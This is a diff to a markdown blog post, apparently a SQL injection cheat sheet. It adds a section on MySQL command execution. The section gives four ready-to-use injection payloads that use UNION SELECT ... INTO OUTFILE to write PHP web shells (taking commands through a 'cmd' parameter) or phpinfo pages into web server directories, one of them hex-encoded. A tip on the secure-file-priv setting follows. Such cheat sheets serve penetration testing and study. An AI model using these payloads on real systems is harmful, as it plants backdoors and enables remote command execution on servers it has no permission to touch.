@@ -1,6 +1,6 @@
 ---
 title: ["SQL Injection Cheat Sheet"]
-date: 2024-12-01 09:00:00 +0900
+date: 2024-12-27 09:00:00 +0900
 categories: [cheatsheet, sqli]
 tags: [web, sqli, cheatsheet]
 ---
@@ -43,3 +43,17 @@ False = 0
 True+True = 2
 True-True = 0
 ```
+
+
+### MYSQL Command Execution
+#### WEBSHELL - OUTFILE Method
+```sql
+[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
+[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
+[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
+[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
+```
+
+Make sure to check `secure-file-priv` path.  
+When `mysql/config/my.cnf` has `secure-file-priv=/tmp/` set, it means:  
+  MYSQL's `INTO OUTFILE` command can only write files to the `/tmp/` directory
